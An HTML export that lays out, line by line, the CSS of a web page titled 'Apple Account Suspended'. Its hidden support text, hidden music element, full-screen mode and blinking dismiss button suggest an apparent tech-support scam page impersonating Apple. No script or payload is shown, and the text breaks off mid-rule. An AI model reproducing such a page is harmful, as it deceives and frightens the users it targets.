<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="1561.61">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; line-height: 14.0px; font: 12.0px Times; color: #000000; -webkit-text-stroke: #000000; min-height: 14.0px}
    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; line-height: 14.0px; font: 12.0px Times; color: #000000; -webkit-text-stroke: #000000}
    span.s1 {font-kerning: none}
    span.s2 {text-decoration: underline ; font-kerning: none; color: #0000ee; -webkit-text-stroke: 0px #0000ee}
    td.td1 {margin: 0.5px 0.5px 0.5px 0.5px; padding: 1.0px 1.0px 1.0px 1.0px}
    td.td2 {width: 2007.8px; margin: 0.5px 0.5px 0.5px 0.5px; padding: 1.0px 1.0px 1.0px 1.0px}
  </style>
</head>
<body>
<table cellspacing="0" cellpadding="0">
  <tbody>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;!DOCTYPE html&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;html&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;meta http-equiv="content-type" content="text/html;charset=utf-8" /&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;head&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;title&gt;Apple Account Suspended&lt;/title&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;style&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">body {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-image: url('nx24rqrixn.png');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-size: 100% 100%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-repeat: no-repeat;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-position: center center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: flex;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">justify-content: center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">align-items: center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">height: 100vh;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin: 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-family: Arial, sans-serif;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: white;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">body.g {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-image: url('5n2p0dgeft.png');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">body.fullscreen {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-image: url('nnr7z2pdkh.jpg');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#support-text {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">position: absolute;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">top: 80%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">left: 50%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">transform: translateX(-50%);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-size: 24px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">text-align: center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">width: 100%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-weight: bold;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: black;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: none;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#support-text span {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-weight: normal;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#music {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: none;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#modal-overlay {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: none;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">position: fixed;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">top: 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">left: 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">width: 100%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">height: 100%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: rgba(0, 0, 0, 0.5);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">z-index: 9999;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#modal-content {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: white;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">border-radius: 5px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">max-width: 400px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin: 100px auto;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">padding: 20px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">text-align: center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#modal-close {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">cursor: pointer;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: #888;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">float: right;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-size: 20px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-weight: bold;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#modal-message {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: black;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-weight: bold;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin-bottom: 20px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#modal-image {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin-bottom: 20px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: flex;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">justify-content: space-between;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin-top: 20px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons button {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">width: 100px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">padding: 10px 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">border: none;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">border-radius: 5px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">cursor: pointer;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-weight: bold;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">transition: background-color 0.3s;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons button.accept {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: white;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: black;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons button.dismiss {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: #3b5998;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: white;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons button:hover {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: rgba(0, 0, 0, 0.8);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">@keyframes blink {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">0% {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">opacity: 1;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">50% {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">opacity: 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">100% {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">opacity: 1;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">.modal-buttons button.dismiss.blinking {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">animation: blink 1s infinite;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#welcomeDiv {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">display: none;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">background-color: #000;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">height: auto;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">width: 550px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">position: fixed;</span></p>
